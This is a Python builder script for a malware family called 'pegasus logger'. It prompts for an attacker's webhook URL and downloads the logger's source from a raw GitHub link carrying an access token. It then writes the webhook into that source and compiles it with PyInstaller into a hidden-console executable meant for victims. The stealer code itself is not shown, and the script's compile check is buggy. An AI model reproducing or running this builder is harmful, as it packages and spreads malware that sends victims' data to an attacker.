import os
import shutil

import requests
from colorama import Fore, Style


def main():
    print(Fore.BLUE + """
__________                                         
\______   \ ____   _________    ________ __  ______
 |     ___// __ \ / ___\__  \  /  ___/  |  \/  ___/
 |    |   \  ___// /_/  > __ \_\___ \|  |  /\___ \ 
 |____|    \___  >___  (____  /____  >____//____  >
               \/_____/     \/     \/           \/ 
               
            Builder for pegasus logger
           github.com/addi00000/pegasus""" + Style.RESET_ALL)
    
    webhook = str(input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL))
    filename = str(input(Fore.CYAN + "Filename: " + Style.RESET_ALL))
    
    raw = requests.get('https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py?token=GHSAT0AAAAAABQE3SPPEGHX65SSXEMVSWU4YSJZJEA').text
    
    print(Fore.YELLOW + f"Creating {filename}.py with '{webhook}' as webhook..." + Style.RESET_ALL)
    
    with open(f"{filename}.py", "w", encoding="utf-8") as f:
        f.write(raw.replace("&WEBHOOK_URL&", webhook))
        
    print(Fore.GREEN + "Done!" + Style.RESET_ALL)
    
    compile = str(input(Fore.CYAN + "Compile? (y/n): " + Style.RESET_ALL))
    
    if compile == 'y' or 'Y':
        print(Fore.YELLOW + f"Beginning compilation..." + Style.RESET_ALL)
        input(Fore.RED + "DO NOT CONTINUE IF YOU DO NOT HAVE PYTHON3 INSTALLED\nPress enter to continue..." + Style.RESET_ALL)
        
        os.system("pip install -r requirements.txt")
        os.system(f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}.py ")
        
        shutil.rmtree("./build")
        shutil.rmtree("./__pycache__")
        os.remove(f"./{filename}.spec")
        
        input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)
        exit()
        
    else:
        exit()
    
if __name__ == '__main__':
    main()
    
# 
